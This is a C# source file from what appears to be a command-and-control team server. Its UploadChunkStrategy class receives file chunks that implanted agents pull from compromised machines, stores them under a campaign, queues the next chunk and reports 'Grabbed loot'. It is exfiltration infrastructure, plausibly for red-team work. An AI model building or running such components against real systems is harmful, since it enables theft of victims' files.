//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
using System.Text.Json;
using TeamServer.Interface;
using TeamServer.Repositories;
using TeamServer.Services;
using Trinity.Shared.DTOs.Command;
using Trinity.Shared.DTOs.Data;
using Trinity.Shared.DTOs.Notification;
using Trinity.Shared.DTOs.Task;
using Trinity.Shared.Enums.Tasks;
using Trinity.Shared.Interfaces;

namespace TeamServer.Handlers.CheckinHandler.Strategies
{
    public class UploadChunkStrategy : ICheckinStrategy
    {
        private readonly IUploadService _uploadService;
        private readonly CommandService _commandService;
        private readonly TaskRepository _taskRepo;
        private readonly AgentRepository _agentRepo;
        private readonly INotificationHub _hub;

        public UploadChunkStrategy(
            IUploadService uploadService,
            CommandService commandService,
            TaskRepository taskRepo,
            AgentRepository agentRepo,
            INotificationHub notificationHub)
        {
            _uploadService = uploadService;
            _commandService = commandService;
            _taskRepo = taskRepo;
            _agentRepo = agentRepo;
            _hub = notificationHub;
        }

        public async System.Threading.Tasks.Task ProcessResponseAsync(JsonElement element)
        {
            if (!element.TryGetProperty("TaskID", out var taskIDElement) ||
                taskIDElement.ValueKind != JsonValueKind.Number ||
                !taskIDElement.TryGetInt32(out var taskID))
            {
                throw new InvalidOperationException(
                    "Upload response is missing a valid TaskID.");
            }

            var task = await _taskRepo.GetByIdAsync(taskID)
                ?? throw new ArgumentNullException("Task does not exist!");

            var agent = await _agentRepo.GetAgentByIDAsync(task.AgentID)
                ?? throw new ArgumentNullException("Agent does not exist!");

            var campaignID = agent.CampaignID;

            var response = JsonSerializer.Deserialize<TaskResp<UploadChunkDTO>>(element.GetRawText());

            if (response == null)
            {
                throw new InvalidOperationException(
                    "Upload response could not be deserialized.");
            }

            var chunk = response.Data;

            if (chunk == null)
            {
                throw new InvalidOperationException(
                    "Upload response contains no chunk data.");
            }

            var uploadResult = await _uploadService.UploadChunkAsync(campaignID, chunk);

            if (!uploadResult.IsSuccess)
            {
                throw new InvalidOperationException(
                    "Upload chunk could not be stored.");
            }

            var status = (Status)response.Status;

            task.Status = status;

            await _taskRepo.CommitAsync();

            if (status == Status.NO_MORE_TO_FOLLOW)
            {
                await _hub.SendTaskResponseAsync(task.AgentID.ToString(), new TaskNotification(
                    DateTime.UtcNow, 
                    taskID, 
                    $"Grabbed loot successfully: {chunk.FileName}",
                    Status.SUCCESS));
                return;
            }

            if (status != Status.MORE_TO_FOLLOW)
            {
                throw new InvalidOperationException(
                    "Upload response contains an invalid continuation status.");
            }

            var originalUpload = task.Command.Deserialize<UploadDTO>();

            if (originalUpload == null)
            {
                throw new InvalidOperationException(
                    "Original upload command could not be deserialized.");
            }

            byte[] bytes;

            try
            {
                bytes = Convert.FromBase64String(chunk.Data);
            }
            catch (FormatException)
            {
                throw new InvalidOperationException(
                    "Upload chunk data is not valid Base64.");
            }

            var nextUpload = new UploadDTO
            {
                Path = originalUpload.Path,
                Offset = chunk.Offset + bytes.Length
            };

            var nextTaskResult =
                await _commandService.QueueTaskAsync(
                    task.AgentID,
                    TaskType.UPLOAD,
                    TaskCode.NO_CODE,
                    nextUpload);

            if (!nextTaskResult.IsSuccess)
            {
                throw new InvalidOperationException(
                    "The next upload task could not be queued.");
            }
        }
    }
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//